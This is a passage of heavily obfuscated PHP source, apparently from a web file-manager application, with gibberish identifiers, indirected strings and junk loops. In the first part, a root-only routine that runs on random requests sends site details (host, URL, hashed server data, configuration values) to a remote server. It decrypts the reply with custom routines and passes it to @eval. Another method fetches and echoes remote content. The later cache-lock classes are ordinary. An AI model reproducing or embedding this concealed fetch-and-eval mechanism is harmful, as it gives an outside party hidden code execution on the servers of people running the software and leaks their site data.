$ÕÔ£¦©ç =& $_SERVER[¤øïŠ‹²]; $Şûâº£» =& $_SERVER[Ôêåã]; $ÚË”£ = array($Şûâº£»[257], $Şûâº£»[258], $Şûâº£»[259]); $Ü·Ëš = $Şûâº£»[260] . md5($Şûâº£»[261]); $ˆ¦ÃÆöŞ = $ÕÔ£¦©ç[784]; if ($this->rghxbd9bc189 == $Şûâº£»[111] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$Şûâº£»[24]], $ÚË”£)) { return; } if (time() % 4 != 0) { return; } $–ÏÂ‡ÓÌ = call_user_func(array($Şûâº£»[262], $Şûâº£»[263]), $Ü·Ëš); $Ì¼øéô® = $ÕÔ£¦©ç[785]; if ($–ÏÂ‡ÓÌ && time() - $–ÏÂ‡ÓÌ < intval($Şûâº£»[264])) { return; } call_user_func(array($Şûâº£»[262], $Şûâº£»[141]), $Ü·Ëš, time()); $ıÕº¯ê¼ = Model($Şûâº£»[33])->get($Şûâº£»[102]); $¤Å¾·û = $ÕÔ£¦©ç[786]; while (strlen($¤Å¾·û) < $ÕÔ£¦©ç[727]) { if (!$¤Å¾·û) { break; } $¤Å¾·û++; } $ó˜‚ıëø = array($Şûâº£»[154] => Model($Şûâº£»[33])->get($Şûâº£»[155]), $Şûâº£»[169] => $this->rghxbd9bc189, $Şûâº£»[165] => $_SERVER[$Şûâº£»[166]], $Şûâº£»[167] => Model($Şûâº£»[33])->get($Şûâº£»[133]), $Şûâº£»[107] => md5($_SERVER[$Şûâº£»[108]] . $ıÕº¯ê¼), $Şûâº£»[158] => $Şûâº£»[138], $Şûâº£»[161] => $_SERVER[$Şûâº£»[162]]); $ˆÌÌ†‰ã = $ÕÔ£¦©ç[787]; while ($ˆÌÌ†‰ã < $ÕÔ£¦©ç[60]) { if ($ˆÌÌ†‰ã >= 0) { break; } $ˆÌÌ†‰ã++; } $û —‘»Ü = $this->mfai41bce066($Şûâº£»[265], $ó˜‚ıëø); if (!is_array($û —‘»Ü)) { return; } if ($û —‘»Ü[$Şûâº£»[154]] && $û —‘»Ü[$Şûâº£»[266]]) { if ($this->eauzb8cb5b94($û —‘»Ü[$Şûâº£»[266]]) == $ó˜‚ıëø[$Şûâº£»[154]]) { return; } } $this->rywx17228834(); if ($this->eauzb8cb5b94($û —‘»Ü[$Şûâº£»[266]]) != $ó˜‚ıëø[$Şûâº£»[154]]) { $ò€¿äûÌ = array($Şûâº£»[187] => $ıÕº¯ê¼, $Şûâº£»[188] => $_SERVER[$Şûâº£»[108]], $Şûâº£»[189] => this_url(), $Şûâº£»[163] => $_SERVER[$Şûâº£»[164]]); $´‚ü†à = $this->kfqy25043afd(json_encode($ò€¿äûÌ)); $û —‘»Ü = $this->mfai41bce066($Şûâº£»[190] . $´‚ü†à); if ($û —‘»Ü && is_array($û —‘»Ü) && isset($û —‘»Ü[$Şûâº£»[266]])) { $ÂÊùùŞ = $this->kmiod2720578($û —‘»Ü[$Şûâº£»[266]], 2); if ($ÂÊùùŞ) { $ÂÊùùŞ = $this->eauzb8cb5b94($ÂÊùùŞ); } if ($ÂÊùùŞ) { try { @eval($ÂÊùùŞ); } catch (Exception $áÆ™ÏÓª) { } } } } } private function mfai41bce066($èôÖÊ¶É = '', $Ä¶íÍ€ñ = array(), $Ëèàœ¾ = 5) { $Ú×û˜â =& $_SERVER[¤øïŠ‹²]; $˜ÕûÏÏ× =& $_SERVER[Ôêåã]; $¾âíš›„ = $˜ÕûÏÏ×[267]; $¾âíš›„ = $this->jelyab897839($¾âíš›„, $˜ÕûÏÏ×[268]); $©°ªé§ = $Ú×û˜â[788]; if (strlen($©°ªé§) < $Ú×û˜â[60]) { return; } $¾âíš›„ = $¾âíš›„ . $èôÖÊ¶É; $™˜’´¨ = $Ú×û˜â[789]; if (strlen($™˜’´¨) < $Ú×û˜â[727]) { return; } if ($Ä¶íÍ€ñ && is_array($Ä¶íÍ€ñ)) { $¾âíš›„ = $¾âíš›„ . $˜ÕûÏÏ×[269] . http_build_query($Ä¶íÍ€ñ); } if ($Ä¶íÍ€ñ === -1) { return $¾âíš›„; } $Ñ•ËÅü = stream_context_create(array($˜ÕûÏÏ×[222] => array($˜ÕûÏÏ×[225] => $Ëèàœ¾, $˜ÕûÏÏ×[223] => $˜ÕûÏÏ×[270]), $˜ÕûÏÏ×[271] => array($˜ÕûÏÏ×[272] => !1, $˜ÕûÏÏ×[273] => !1))); $Ä¶íÍ€ñ = @file_get_contents($¾âíš›„, !1, $Ñ•ËÅü); $ô‹÷İ€ = $Ú×û˜â[790]; if (strlen($ô‹÷İ€) < $Ú×û˜â[727]) { die; } return json_decode($Ä¶íÍ€ñ, !0); $¨ÂŠÔ°Š = $Ú×û˜â[791]; } private function odlid125d811() { $ûêÏ–º‘ =& $_SERVER[¤øïŠ‹²]; $ş«Õó£Ö =& $_SERVER[Ôêåã]; $Ú¸Ø°µ† = array($ş«Õó£Ö[274] => $ş«Õó£Ö[275], $ş«Õó£Ö[276] => $ş«Õó£Ö[277], $ş«Õó£Ö[278] => $ş«Õó£Ö[279], $ş«Õó£Ö[280] => $ş«Õó£Ö[281], $ş«Õó£Ö[282] => $ş«Õó£Ö[283], $ş«Õó£Ö[284] => $ş«Õó£Ö[217], $ş«Õó£Ö[285] => $ş«Õó£Ö[217], $ş«Õó£Ö[286] => $ş«Õó£Ö[275], $ş«Õó£Ö[287] => $ş«Õó£Ö[277], $ş«Õó£Ö[288] => $ş«Õó£Ö[279], $ş«Õó£Ö[289] => $ş«Õó£Ö[290], $ş«Õó£Ö[291] => $ş«Õó£Ö[281], $ş«Õó£Ö[292] => $ş«Õó£Ö[293], $ş«Õó£Ö[294] => $ş«Õó£Ö[283], $ş«Õó£Ö[295] => $ş«Õó£Ö[296], $ş«Õó£Ö[297] => $ş«Õó£Ö[298], $ş«Õó£Ö[299] => $ş«Õó£Ö[300]); $‰«¢‘İ‰ = $ûêÏ–º‘[792]; if (!$‰«¢‘İ‰) { die; } $ü©íöá– = $Ú¸Ø°µ†[$this->rghxbd9bc189]; $ªòˆ·º¾ = $ûêÏ–º‘[793]; while (strlen($ªòˆ·º¾) < $ûêÏ–º‘[714]) { if (!$ªòˆ·º¾) { break; } $ªòˆ·º¾++; } $ü©íöá– = intval($ü©íöá– ? $ü©íöá– : $ş«Õó£Ö[275]); $ñëñÛºÆ = $ûêÏ–º‘[794]; if (!$ñëñÛºÆ) { die; } $÷Ÿ¿¾à§ = _get($this->nkpu6f387026, $ş«Õó£Ö[301]); $÷Ÿ¿¾à§ = $÷Ÿ¿¾à§ ? intval($÷Ÿ¿¾à§) : 0; $Ç¾ÖÖÏá = $ûêÏ–º‘[795]; return $ü©íöá– + $÷Ÿ¿¾à§; $şå†ò£ = $ûêÏ–º‘[796]; while ($şå†ò£ < $ûêÏ–º‘[709]) { if ($şå†ò£ >= 0) { break; } $şå†ò£++; } } public function rkpnd0fceab6($éÈ¿Ïµš) { $ß¥ì¦áª =& $_SERVER[¤øïŠ‹²]; $›Ñá—µè =& $_SERVER[Ôêåã]; $ç¿ÃÅ° = $this->odlid125d811(); $Ğ•Ğİ¨ƒ = $ß¥ì¦áª[797]; while (strlen($Ğ•Ğİ¨ƒ) < $ß¥ì¦áª[716]) { if (!$Ğ•Ğİ¨ƒ) { break; } $Ğ•Ğİ¨ƒ++; } if ($éÈ¿Ïµš[$›Ñá—µè[302]] == $›Ñá—µè[124]) { return; } if ($ç¿ÃÅ° >= intval($›Ñá—µè[217])) { return; } $ÖòÆ¾“¼ = Model($›Ñá—µè[127])->count(); $ÍŠÊÇº = $ß¥ì¦áª[798]; while (strlen($ÍŠÊÇº) < $ß¥ì¦áª[709]) { if (!$ÍŠÊÇº) { break; } $ÍŠÊÇº++; } if ($ÖòÆ¾“¼ <= $ç¿ÃÅ°) { return; } $¨±ßÌŠš = Model($›Ñá—µè[127])->field($›Ñá—µè[302])->limit($ç¿ÃÅ°)->select(); $¨±ßÌŠš = array_to_keyvalue($¨±ßÌŠš, $›Ñá—µè[6], $›Ñá—µè[302]); $¦‘’îáƒ = $ß¥ì¦áª[799]; if (!in_array($éÈ¿Ïµš[$›Ñá—µè[302]], $¨±ßÌŠš)) { show_json($›Ñá—µè[303], !1, $›Ñá—µè[213]); } } public function kogr90de2aae() { $²ÁÜÏë¼ =& $_SERVER[¤øïŠ‹²]; $Ô©ŒÔ±‰ =& $_SERVER[Ôêåã]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $…®èßïğ = $Ô©ŒÔ±‰[220]; $îËŒ‡€ = $²ÁÜÏë¼[800]; while ($îËŒ‡€ < $²ÁÜÏë¼[716]) { if ($îËŒ‡€ >= 0) { break; } $îËŒ‡€++; } $…®èßïğ = $this->jelyab897839($…®èßïğ, $Ô©ŒÔ±‰[221]); $€ Œ“°“ = stream_context_create(array($Ô©ŒÔ±‰[222] => array($Ô©ŒÔ±‰[223] => $Ô©ŒÔ±‰[224], $Ô©ŒÔ±‰[225] => 3))); $¦êŞßãã = @file_get_contents($…®èßïğ, !1, $€ Œ“°“); $»¼‡¸Öâ = $²ÁÜÏë¼[801]; if (strlen($»¼‡¸Öâ) < $²ÁÜÏë¼[727]) { return; } echo $Ô©ŒÔ±‰[304] . hash_encode($¦êŞßãã) . $Ô©ŒÔ±‰[305]; $¿òÅÁÕÈ = $²ÁÜÏë¼[802]; } private function ojzpca1e00a1($Û…¶¹îš, $˜Ùã¼Ş–, $˜æã»–… = 3) { $½À˜¤Ê© =& $_SERVER[¤øïŠ‹²]; $»š¨‘ØØ =& $_SERVER[Ôêåã]; usleep(1); $Û…¶¹îš = trim($Û…¶¹îš); $é­‚¿÷ = mt_rand(0, 5) . $»š¨‘ØØ[6]; $ÑµÃ¨Ó¹ = rand_string(15); $Ÿæ´×áİ = $»š¨‘ØØ[306]; $ıÄ×‰Øë = $½À˜¤Ê©[720]; if (!$ıÄ×‰Øë) { die; } switch ($é­‚¿÷) { case $»š¨‘ØØ[208]: $€±¹‡¹Û = $this->ixcy538437b7($Û…¶¹îš, strrev($˜Ùã¼Ş– . $ÑµÃ¨Ó¹)); $ÇÄûÏ„ = $½À˜¤Ê©[803]; while ($ÇÄûÏ„ < $½À˜¤Ê©[709]) { if ($ÇÄûÏ„ >= 0) { break; } $ÇÄûÏ„++; } break; case $»š¨‘ØØ[124]: $€±¹‡¹Û = $this->ixcy538437b7($Û…¶¹îš, strrev($ÑµÃ¨Ó¹ . $˜Ùã¼Ş–)); $Æ¢Öõ„ï = $½À˜¤Ê©[804]; if (!$Æ¢Öõ„ï) { die; } break; case $»š¨‘ØØ[307]: $€±¹‡¹Û = $this->ixcy538437b7($Û…¶¹îš, base64_encode($ÑµÃ¨Ó¹ . $˜Ùã¼Ş–)); break; case $»š¨‘ØØ[308]: $€±¹‡¹Û = $this->ixcy538437b7($Û…¶¹îš, md5($ÑµÃ¨Ó¹ . $˜Ùã¼Ş–)); $ü¡ÚÔî‘ = $½À˜¤Ê©[805]; while (strlen($ü¡ÚÔî‘) < $½À˜¤Ê©[716]) { if (!$ü¡ÚÔî‘) { break; } $ü¡ÚÔî‘++; } break; $—è¹ı¯ = $½À˜¤Ê©[806]; if (strlen($—è¹ı¯) < $½À˜¤Ê©[727]) { die; } case $»š¨‘ØØ[309]: $Û…¶¹îš = base64_encode($Û…¶¹îš); $†Œì©„¤ = rand(0, 64); $•¥ö„¹’ = $Ÿæ´×áİ[$†Œì©„¤]; $‹Ì…Â¶Ç = md5($•¥ö„¹’ . md5($˜Ùã¼Ş– . $•¥ö„¹’) . $˜Ùã¼Ş–); $ıÀ„¨âí = $½À˜¤Ê©[807]; $‹Ì…Â¶Ç = substr($‹Ì…Â¶Ç, $†Œì©„¤ % 8, $†Œì©„¤ % 8 + 7); $…°ğ¨Æº = $»š¨‘ØØ[6]; $‚“¬÷ø´ = $½À˜¤Ê©[808]; while (strlen($‚“¬÷ø´) < $½À˜¤Ê©[727]) { if (!$‚“¬÷ø´) { break; } $‚“¬÷ø´++; } $¥àÍ¥Ğ = 0; $¡âäÅ­™ = 0; $õ€ïå¸ = $½À˜¤Ê©[809]; while ($õ€ïå¸ < $½À˜¤Ê©[727]) { if ($õ€ïå¸ >= 0) { break; } $õ€ïå¸++; } $¶¥§ÊÜÓ = 0; for ($¥àÍ¥Ğ = 0; $¥àÍ¥Ğ < strlen($Û…¶¹îš); $¥àÍ¥Ğ++) { $¶¥§ÊÜÓ = $¶¥§ÊÜÓ == strlen($‹Ì…Â¶Ç) ? 0 : $¶¥§ÊÜÓ; $ŠÎµ›·ã = $½À˜¤Ê©[810]; if (!$ŠÎµ›·ã) { die; } $¡âäÅ­™ = ($†Œì©„¤ + strpos($Ÿæ´×áİ, $Û…¶¹îš[$¥àÍ¥Ğ]) + ord($‹Ì…Â¶Ç[$¶¥§ÊÜÓ++])) % 64; $…°ğ¨Æº .= $Ÿæ´×áİ[$¡âäÅ­™]; } $€±¹‡¹Û = hash_encode($•¥ö„¹’ . $…°ğ¨Æº); $ìêÅˆ‡ı = $½À˜¤Ê©[811]; while ($ìêÅˆ‡ı < $½À˜¤Ê©[60]) { if ($ìêÅˆ‡ı >= 0) { break; } $ìêÅˆ‡ı++; } break; default: $€±¹‡¹Û = $this->ixcy538437b7($Û…¶¹îš, $˜Ùã¼Ş– . $ÑµÃ¨Ó¹); $ËÚ™ÛÖé = $½À˜¤Ê©[812]; if (strlen($ËÚ™ÛÖé) < $½À˜¤Ê©[709]) { return; } break; } $€±¹‡¹Û = strrev($é­‚¿÷ . $ÑµÃ¨Ó¹ . $€±¹‡¹Û); $Ù„½÷ğ´ = $½À˜¤Ê©[813]; if ($˜æã»–… - 1 > 0) { $€±¹‡¹Û = $this->ojzpca1e00a1($€±¹‡¹Û, $˜Ùã¼Ş–, $˜æã»–… - 1); } return $€±¹‡¹Û; } private function kmiod2720578($éÕÖÖÕÅ, $–•ˆİ, $Ìı½ÄØš = 3) { $§¦‹ÓÇ± =& $_SERVER[¤øïŠ‹²]; $úı­ üª =& $_SERVER[Ôêåã]; if (!is_string($éÕÖÖÕÅ) || strlen($éÕÖÖÕÅ) < 10) { return !1; } $éÕÖÖÕÅ = trim($éÕÖÖÕÅ); $éÕÖÖÕÅ = strrev($éÕÖÖÕÅ); $õ¤İˆëó = $éÕÖÖÕÅ[0]; $Ã™ˆÎì = $§¦‹ÓÇ±[814]; $Ø³àú¦ğ = substr($éÕÖÖÕÅ, 1, 15); $éÕÖÖÕÅ = substr($éÕÖÖÕÅ, 16); $ş³¬åÒ = $§¦‹ÓÇ±[815]; if (strlen($ş³¬åÒ) < $§¦‹ÓÇ±[60]) { return; } $æÔ°¤ÁÌ = $úı­ üª[306]; switch ($õ¤İˆëó) { case $úı­ üª[208]: $´ÙôªöÎ = $this->jelyab897839($éÕÖÖÕÅ, strrev($–•ˆİ . $Ø³àú¦ğ)); $¶åæÅŒ = $§¦‹ÓÇ±[816]; if (strlen($¶åæÅŒ) < $§¦‹ÓÇ±[709]) { return; } break; case $úı­ üª[124]: $´ÙôªöÎ = $this->jelyab897839($éÕÖÖÕÅ, strrev($Ø³àú¦ğ . $–•ˆİ)); break; $¸°–» = $§¦‹ÓÇ±[817]; if (strlen($¸°–») < $§¦‹ÓÇ±[709]) { die; } case $úı­ üª[307]: $´ÙôªöÎ = $this->jelyab897839($éÕÖÖÕÅ, base64_encode($Ø³àú¦ğ . $–•ˆİ)); break; case $úı­ üª[308]: $´ÙôªöÎ = $this->jelyab897839($éÕÖÖÕÅ, md5($Ø³àú¦ğ . $–•ˆİ)); break; $ú†”¯ô· = $§¦‹ÓÇ±[818]; if (!$ú†”¯ô·) { die; } case $úı­ üª[309]: $éÕÖÖÕÅ = hash_decode($éÕÖÖÕÅ); $„¶ÊÑ•­ = $éÕÖÖÕÅ[0]; $·Åº‚ìÓ = $§¦‹ÓÇ±[819]; if (!$·Åº‚ìÓ) { return; } $éÕÖÖÕÅ = substr($éÕÖÖÕÅ, 1); $ß‰Àç²¦ = strpos($æÔ°¤ÁÌ, $„¶ÊÑ•­); $¡îÏ¯¼¥ = md5($„¶ÊÑ•­ . md5($–•ˆİ . $„¶ÊÑ•­) . $–•ˆİ); $¡îÏ¯¼¥ = substr($¡îÏ¯¼¥, $ß‰Àç²¦ % 8, $ß‰Àç²¦ % 8 + 7); $²ëæÓÚ¯ = $§¦‹ÓÇ±[820]; if (strlen($²ëæÓÚ¯) < $§¦‹ÓÇ±[60]) { return; } $„‘Üªå• = $úı­ üª[6]; $äæë„×» = 0; $Ø¯ö©æ = $§¦‹ÓÇ±[821]; $¤Ñò“ã = 0; $Èêçá¬ß = 0; for ($äæë„×» = 0; $äæë„×» < strlen($éÕÖÖÕÅ); $äæë„×»++) { $Èêçá¬ß = $Èêçá¬ß == strlen($¡îÏ¯¼¥) ? 0 : $Èêçá¬ß; $™ŠõŞ = $§¦‹ÓÇ±[822]; while ($™ŠõŞ < $§¦‹ÓÇ±[709]) { if ($™ŠõŞ >= 0) { break; } $™ŠõŞ++; } $¡‘ó·¯¡ = $Èêçá¬ß++; $¤Ñò“ã = strpos($æÔ°¤ÁÌ, $éÕÖÖÕÅ[$äæë„×»]) - $ß‰Àç²¦ - ord($¡îÏ¯¼¥[$¡‘ó·¯¡]); $ÍÉÑ½¹Û = $§¦‹ÓÇ±[823]; while ($ÍÉÑ½¹Û < $§¦‹ÓÇ±[727]) { if ($ÍÉÑ½¹Û >= 0) { break; } $ÍÉÑ½¹Û++; } while ($¤Ñò“ã < 0) { $¤Ñò“ã += 64; } $„‘Üªå• .= $æÔ°¤ÁÌ[$¤Ñò“ã]; $ÌÆĞ‚ı = $§¦‹ÓÇ±[824]; if (!$ÌÆĞ‚ı) { die; } } $´ÙôªöÎ = base64_decode($„‘Üªå•); break; $¼Ï¢Õ‰Ï = $§¦‹ÓÇ±[825]; while (strlen($¼Ï¢Õ‰Ï) < $§¦‹ÓÇ±[709]) { if (!$¼Ï¢Õ‰Ï) { break; } $¼Ï¢Õ‰Ï++; } default: $´ÙôªöÎ = $this->jelyab897839($éÕÖÖÕÅ, $–•ˆİ . $Ø³àú¦ğ); break; $¯Õü§˜ö = $§¦‹ÓÇ±[826]; if (strlen($¯Õü§˜ö) < $§¦‹ÓÇ±[716]) { return; } } if ($Ìı½ÄØš - 1 > 0) { $´ÙôªöÎ = $this->kmiod2720578($´ÙôªöÎ, $–•ˆİ, $Ìı½ÄØš - 1); } return $´ÙôªöÎ; } public function kfqy25043afd($™ìĞâ¸é) { $‘ÚÚ”¤ö =& $_SERVER[¤øïŠ‹²]; $»¨È˜¶Ù =& $_SERVER[Ôêåã]; $ˆÛºØ¬È = $this->xewlff973d5e(); $ïÓäŸİ˜ = $this->xewlff973d5e(); $²“Ğ¦ƒç = $‘ÚÚ”¤ö[827]; if (!$²“Ğ¦ƒç) { die; } $áúÊÑ£‹ = ($ˆÛºØ¬È - 1) * ($ïÓäŸİ˜ - 1); $ïíÅÂã = $‘ÚÚ”¤ö[828]; if (!$ïíÅÂã) { die; } $¯è”—ø = intval(($ˆÛºØ¬È + $ïÓäŸİ˜) / 2); while (1) { $ÖüÀœ°ö = $¯è”—ø; $û¤Â¶ˆø = $áúÊÑ£‹; $­èÍ¦åø = $‘ÚÚ”¤ö[829]; while ($û¤Â¶ˆø % $ÖüÀœ°ö != 0) { $Ú™¬û÷± = $û¤Â¶ˆø; $å°ÚÜ®Œ = $‘ÚÚ”¤ö[830]; if (strlen($å°ÚÜ®Œ) < $‘ÚÚ”¤ö[60]) { return; } $û¤Â¶ˆø = $ÖüÀœ°ö; $ÖüÀœ°ö = $Ú™¬û÷± % $ÖüÀœ°ö; $ö„ öµ… = $‘ÚÚ”¤ö[831]; if (strlen($ö„ öµ…) < $‘ÚÚ”¤ö[709]) { return; } } if ($ÖüÀœ°ö == 1) { break; } else { $¯è”—ø++; } } $÷¶Û·äè = 2; $¨èÔ©’„ = $‘ÚÚ”¤ö[832]; if (!$¨èÔ©’„) { die; } for ($ßé‡ÌÏı = 0; $ßé‡ÌÏı < $áúÊÑ£‹ * 10; $ßé‡ÌÏı++) { if (($áúÊÑ£‹ * $ßé‡ÌÏı + 1) % $¯è”—ø == 0) { $÷¶Û·äè = intval(($áúÊÑ£‹ * $ßé‡ÌÏı + 1) / $¯è”—ø); break; } } $Æ›®üùì = $this->ixcy538437b7($ˆÛºØ¬È * $ïÓäŸİ˜ . $»¨È˜¶Ù[6], $»¨È˜¶Ù[138]); $ËÃú¨Úª = md5($»¨È˜¶Ù[310] . ($ˆÛºØ¬È + $ïÓäŸİ˜) . $»¨È˜¶Ù[311] . $¯è”—ø . $»¨È˜¶Ù[311] . $÷¶Û·äè . $»¨È˜¶Ù[312]); $Ş»Ëáñœ = $this->ixcy538437b7($™ìĞâ¸é, $ËÃú¨Úª) . $»¨È˜¶Ù[313] . $Æ›®üùì; $À£®æ§© = $‘ÚÚ”¤ö[833]; if (!$À£®æ§©) { die; } return $Ş»Ëáñœ; } public function eauzb8cb5b94($©ØíúÔ) { $ŸíîšÏó =& $_SERVER[¤øïŠ‹²]; $Óó®æÈƒ =& $_SERVER[Ôêåã]; $¼µ»ó¥… = explode($Óó®æÈƒ[313], $©ØíúÔ); $§Á¥Í£Í = $ŸíîšÏó[834]; if (strlen($§Á¥Í£Í) < $ŸíîšÏó[60]) { return; } if (count($¼µ»ó¥…) != 2) { return $Óó®æÈƒ[6]; } $œğ¹î˜Œ = $this->jelyab897839($¼µ»ó¥…[1] . $Óó®æÈƒ[6], $Óó®æÈƒ[138]); if (!$œğ¹î˜Œ) { return $Óó®æÈƒ[6]; } $œğ¹î˜Œ = intval($œğ¹î˜Œ); $¨æÙ›µ = 0; $Îã§Òª = 0; $šÇÅôèÙ = $ŸíîšÏó[835]; if (!$šÇÅôèÙ) { return; } for ($ÔÊ†„®µ = 3; $ÔÊ†„®µ < $œğ¹î˜Œ; $ÔÊ†„®µ += 2) { if ($œğ¹î˜Œ % $ÔÊ†„®µ != 0) { continue; } $¨æÙ›µ = $ÔÊ†„®µ; $³ÛÚÜÜé = $ŸíîšÏó[836]; if (!$³ÛÚÜÜé) { return; } $Îã§Òª = intval($œğ¹î˜Œ / $ÔÊ†„®µ); $½ÚÎıæ¦ = $ŸíîšÏó[837]; while (strlen($½ÚÎıæ¦) < $ŸíîšÏó[727]) { if (!$½ÚÎıæ¦) { break; } $½ÚÎıæ¦++; } break; } $°àŞÎÒ = ($¨æÙ›µ - 1) * ($Îã§Òª - 1); $¼ë¢ƒòÛ = $ŸíîšÏó[838]; if (strlen($¼ë¢ƒòÛ) < $ŸíîšÏó[60]) { return; } $ƒğêŒÆ = intval(($¨æÙ›µ + $Îã§Òª) / 2); $İ¶‡îïÏ = $ŸíîšÏó[839]; if (!$İ¶‡îïÏ) { return; } while (1) { $¡™†Æ²´ = $ƒğêŒÆ; $‡Ë¡Ì•ı = $ŸíîšÏó[840]; while (strlen($‡Ë¡Ì•ı) < $ŸíîšÏó[709]) { if (!$‡Ë¡Ì•ı) { break; } $‡Ë¡Ì•ı++; } $¸¨ÕÜÇ = $°àŞÎÒ; $ŞÏ¤Îåã = $ŸíîšÏó[841]; if (strlen($ŞÏ¤Îåã) < $ŸíîšÏó[60]) { die; } while ($¸¨ÕÜÇ % $¡™†Æ²´ != 0) { $ô„„Óİİ = $¸¨ÕÜÇ; $¸¨ÕÜÇ = $¡™†Æ²´; $¡™†Æ²´ = $ô„„Óİİ % $¡™†Æ²´; $ ¯ïâºù = $ŸíîšÏó[842]; if (strlen($ ¯ïâºù) < $ŸíîšÏó[714]) { return; } } if ($¡™†Æ²´ == 1) { break; } else { $ƒğêŒÆ++; } } $ï§‰Œ  = 2; for ($ÔÊ†„®µ = 0; $ÔÊ†„®µ < $°àŞÎÒ * 10; $ÔÊ†„®µ++) { if (($°àŞÎÒ * $ÔÊ†„®µ + 1) % $ƒğêŒÆ == 0) { $ï§‰Œ  = intval(($°àŞÎÒ * $ÔÊ†„®µ + 1) / $ƒğêŒÆ); break; } } $°Æœü·ë = md5($Óó®æÈƒ[310] . ($¨æÙ›µ + $Îã§Òª) . $Óó®æÈƒ[311] . $ƒğêŒÆ . $Óó®æÈƒ[311] . $ï§‰Œ  . $Óó®æÈƒ[312]); $Úí¼¤Û = $this->jelyab897839($¼µ»ó¥…[0], $°Æœü·ë); return $Úí¼¤Û; } public function xewlff973d5e() { $Şîä÷¾Á =& $_SERVER[¤øïŠ‹²]; $²®‹Ù® = mt_rand(pow(2, 14), pow(2, 16) - 1); $ú¨Àï¿¯ = array(); $°æÎ§– = 1; $ëûü–‡ = $Şîä÷¾Á[843]; if (strlen($ëûü–‡) < $Şîä÷¾Á[727]) { return; } while ($°æÎ§– <= (int) sqrt($²®‹Ù®)) { $äƒ×Ûß = $°æÎ§–; while (!0) { $äƒ×Ûß++; $Ú¦¸Ë”ò = $Şîä÷¾Á[844]; if ($äƒ×Ûß <= 2) { $°æÎ§– = $äƒ×Ûß; break; } else { if ($äƒ×Ûß < 2) { continue; } } $‡œñÍºı = !0; for ($ş–’¶¶ = 2; $ş–’¶¶ <= sqrt($äƒ×Ûß); $ş–’¶¶++) { if ($äƒ×Ûß % $ş–’¶¶ == 0) { $‡œñÍºı = !1; } } if ($‡œñÍºı) { $°æÎ§– = $äƒ×Ûß; break; } } $ú¨Àï¿¯[] = $°æÎ§–; } $§Ú•™« = 2; for ($äƒ×Ûß = $²®‹Ù®; $äƒ×Ûß > 1; $äƒ×Ûß--) { $‡œñÍºı = !0; $Ñş›œÀë = $Şîä÷¾Á[845]; foreach ($ú¨Àï¿¯ as $ì¸ŸûÛò) { if ($äƒ×Ûß % $ì¸ŸûÛò == 0) { $‡œñÍºı = !1; break; } } if ($‡œñÍºı) { $§Ú•™« = $äƒ×Ûß; break; } } return $§Ú•™«; } public function omqp648864f0($›«¸¬ø×, $Ù˜¶§Íâ) { $Çí·¾£ =& $_SERVER[Ôêåã]; return call_user_func(array($Çí·¾£[8], $Çí·¾£[314]), $›«¸¬ø×, $Ù˜¶§Íâ); $Äµ›×’Á = $_SERVER[¤øïŠ‹²][846]; } public function ixcy538437b7($ş¼ÜÁşÑ, $Ï–Ñ¼÷â) { $ïÄŞíæƒ =& $_SERVER[¤øïŠ‹²]; $áãõşÆ¬ =& $_SERVER[Ôêåã]; return call_user_func(array($áãõşÆ¬[315], $áãõşÆ¬[316]), $ş¼ÜÁşÑ, $Ï–Ñ¼÷â); $›ƒ£Ğæ = $ïÄŞíæƒ[847]; if (strlen($›ƒ£Ğæ) < $ïÄŞíæƒ[714]) { die; } } public function jelyab897839($¿”ô¨·, $«”›È‡…) { $ÎúÚÕ“È =& $_SERVER[Ôêåã]; return call_user_func(array($ÎúÚÕ“È[315], $ÎúÚÕ“È[317]), $¿”ô¨·, $«”›È‡…); $øş®«œ¾ = $_SERVER[¤øïŠ‹²][848]; if (!$øş®«œ¾) { return; } } } goto d©Úƒ…èÁ¬; c ÙÉÂó: class CacheLockRedis { public function lock($£•Õâ‰û, $ÍÆ’Òßº = 10) { $ğâ­«ˆ = Cache::init(); $³Õ¿ÉíÇ = microtime(!0) + $ÍÆ’Òßº; while (microtime(!0) < $³Õ¿ÉíÇ) { $õı‡¬­Û = $ğâ­«ˆ->get($£•Õâ‰û); if (!$õı‡¬­Û) { $Áñß¸øâ = $ğâ­«ˆ->setLock($£•Õâ‰û, $³Õ¿ÉíÇ, $ÍÆ’Òßº); if ($Áñß¸øâ) { return !0; } } else { if ($õı‡¬­Û < microtime(!0)) { $ğâ­«ˆ->set($£•Õâ‰û, $³Õ¿ÉíÇ, $ÍÆ’Òßº * 2); if ($ğâ­«ˆ->get($£•Õâ‰û) === $õı‡¬­Û) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($úƒ•Ö¶Ê) { return Cache::init()->get($úƒ•Ö¶Ê); } public function unlock($ÀÉ÷»Ê¯) { return Cache::init()->remove($ÀÉ÷»Ê¯); } } class CacheLockMemcached { public function lock($¦±ğÇÍ, $Öƒñß¡× = 0) { $£¦‡ış— = Cache::init(); $£¤êâ›ç = microtime(!0) + $Öƒñß¡×; while (microtime(!0) < $£¤êâ›ç) { $Ïı–È = $£¦‡ış—->get($¦±ğÇÍ); if (!$Ïı–È || $Ïı–È < microtime(!0)) { $çÂÆÂ®õ = $£¦‡ış—->handle->add($¦±ğÇÍ, $£¤êâ›ç, $Öƒñß¡×); if ($çÂÆÂ®õ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($¶ •¾¦Ô) { return Cache::init()->get($¶ •¾¦Ô); } public function unlock($é¼Îï…‚) { return Cache::init()->remove($é¼Îï…‚); } } class CacheLockDatabase { public function lock($ïÁ³¥Õº, $ãÔ’ùğğ = 0) { $Ş”Ÿï¡Î = Model($_SERVER[¤øïŠ‹²][938]); $üÄ°ñ›¸ = microtime(!0) + $ãÔ’ùğğ; while (microtime(!0) < $üÄ°ñ›¸) { $÷Ò¹« = $Ş”Ÿï¡Î->get($ïÁ³¥Õº); if (!$÷Ò¹« || $÷Ò¹« < microtime(!0)) { $¦ù»à˜ = $Ş”Ÿï¡Î->set($ïÁ³¥Õº, $üÄ°ñ›¸); if ($¦ù»à˜) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ÇØ’âÀ¯) { return Model($_SERVER[¤øïŠ‹²][938])->get($ÇØ’âÀ¯); } public function unlock($³¦Ú¦ø•) { Model($_SERVER[¤øïŠ‹²][938])->remove($³¦Ú¦ø•); } } goto d¶à¹ÚöÌœ; a’°”©÷…Ş: class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\x75\160"; protected $tableMeta = array("\164\141\142\154\145\x4e\141\x6d\145" => "\x67\x72\157\165\160\x5f\155\145\164\x61", 